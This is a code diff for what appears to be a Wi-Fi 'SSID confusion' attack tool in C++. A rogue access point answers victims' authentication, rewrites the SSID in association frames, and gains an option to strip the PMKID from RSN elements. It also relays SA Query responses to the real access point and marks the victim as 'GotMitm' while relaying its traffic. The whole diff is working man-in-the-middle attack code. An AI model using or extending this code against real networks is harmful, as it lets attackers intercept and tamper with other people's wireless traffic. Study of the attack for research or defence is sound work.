@@ -39,7 +39,7 @@ FrameProcess SsidConfusion::handle_probe(const HWAddress<6> addr2, const PDU *pd
 FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) {
 	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()) {
 		if(auth->auth_algorithm() == 0 && auth->auth_seq_number() == 1) {
-			if(client_state.get_state() >= ClientState::Authenticated) return STOP;
+			if(client_state.get_state() >= ClientState::Associated) return STOP;
 			// Open System Auth seq=1 ->  seq=2 success
 			Dot11Authentication resp(addr2, rogue_ap->get(SK::mac));
 			resp.addr3(rogue_ap->get(SK::mac));
@@ -89,6 +89,7 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot1
 
 	auto translated = ensure_radiotap(raw);
 	rewrite_ssid_in_frame(translated, "WrongNet"); //TODO hardcoded
+	if(strip_pmkid_in_assoc) strip_pmkid_from_rsn_ie(translated);
 	send_to_real(translated);
 	return STOP;
 }
@@ -115,11 +116,21 @@ void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const 
 	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11, raw))
 	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr2, *pdu, raw))
 
+	// SA Query Response from STA -> relay to real AP (transparent, MIC stays valid)
+	if(dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == 13 &&
+	   addr2 == HWAddress<6>(sta.get(SK::mac))) {
+		display_traffic(*dot11, "Rogue channel", " SA Query resp -- relay to real");
+		send_to_real(raw);
+		return;
+	}
+
 #undef SOLVE_OR_CONTINUE
 
 	if(addr2 == sta.get(SK::mac)) {
 		if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>())
 			client_state.update_state(ClientState::Target_disconnected);
+		if(dot11->type() == Dot11::DATA && client_state.get_state() < ClientState::GotMitm)
+			client_state.update_state(ClientState::GotMitm);
 		display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
 		send_to_real(raw);
 	}
